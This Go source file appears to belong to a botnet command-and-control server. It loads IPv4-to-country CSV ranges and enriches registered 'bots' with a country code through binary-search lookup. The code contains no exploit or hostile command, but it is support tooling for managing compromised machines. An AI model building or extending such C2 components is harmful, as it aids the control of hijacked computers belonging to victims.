// language: Go, file: cnc/internal/registry/geoip.go
// *local geoip: load IPv4 ranges once, binary-search lookup. no per-connect network call*
package registry

import (
	"bufio"
	"encoding/binary"
	"errors"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
)

// geoRange is one contiguous IPv4 block and its country code.
type geoRange struct {
	start uint32 // inclusive, host byte order
	end   uint32 // inclusive
	cc    string
}

// GeoDB is the loaded range table, sorted by start for binary search.
type GeoDB struct {
	mu     sync.RWMutex
	ranges []geoRange
	loaded bool
}

// NewGeoDB returns an empty DB until Load is called.
func NewGeoDB() *GeoDB { return &GeoDB{} }

// Load reads a CSV of "start_ip,end_ip,CC" per line. Accepts either decimal
// uint32s or dotted-quad for start/end, so both common geoip exports work.
func (g *GeoDB) Load(path string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()

	var out []geoRange
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 64*1024), 4*1024*1024)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || line[0] == '#' {
			continue
		}
		parts := strings.Split(line, ",")
		if len(parts) < 3 {
			continue
		}
		start, ok1 := parseIPField(parts[0])
		end, ok2 := parseIPField(parts[1])
		cc := strings.ToUpper(strings.TrimSpace(parts[2]))
		if !ok1 || !ok2 || len(cc) != 2 {
			continue
		}
		if start > end {
			start, end = end, start
		}
		out = append(out, geoRange{start: start, end: end, cc: cc})
	}
	if err := sc.Err(); err != nil {
		return err
	}
	if len(out) == 0 {
		return errors.New("geoip: no ranges parsed")
	}
	sort.Slice(out, func(i, j int) bool { return out[i].start < out[j].start })

	g.mu.Lock()
	g.ranges = out
	g.loaded = true
	g.mu.Unlock()
	return nil
}

// Lookup returns the country code for an IPv4 string, or "" if unknown.
// Uses binary search over start addresses, then checks end bound.
func (g *GeoDB) Lookup(ip string) string {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return ""
	}
	v4 := parsed.To4()
	if v4 == nil {
		return "" // IPv6 not covered by this table
	}
	target := binary.BigEndian.Uint32(v4)

	g.mu.RLock()
	defer g.mu.RUnlock()
	if !g.loaded || len(g.ranges) == 0 {
		return ""
	}

	// first range whose start > target, then step back one
	i := sort.Search(len(g.ranges), func(k int) bool {
		return g.ranges[k].start > target
	})
	if i == 0 {
		return ""
	}
	r := g.ranges[i-1]
	if target >= r.start && target <= r.end {
		return r.cc
	}
	return ""
}

// Enrich fills Country on a bot if it's empty. Called from botconn after Register.
func (g *GeoDB) Enrich(b *Bot) {
	if b.Country != "" {
		return
	}
	if cc := g.Lookup(b.IP); cc != "" {
		b.Country = cc
	}
}

// parseIPField accepts "3232235776" or "192.168.1.0".
func parseIPField(s string) (uint32, bool) {
	s = strings.TrimSpace(s)
	if s == "" {
		return 0, false
	}
	if n, err := strconv.ParseUint(s, 10, 32); err == nil {
		return uint32(n), true
	}
	parsed := net.ParseIP(s)
	if parsed == nil {
		return 0, false
	}
	v4 := parsed.To4()
	if v4 == nil {
		return 0, false
	}
	return binary.BigEndian.Uint32(v4), true
}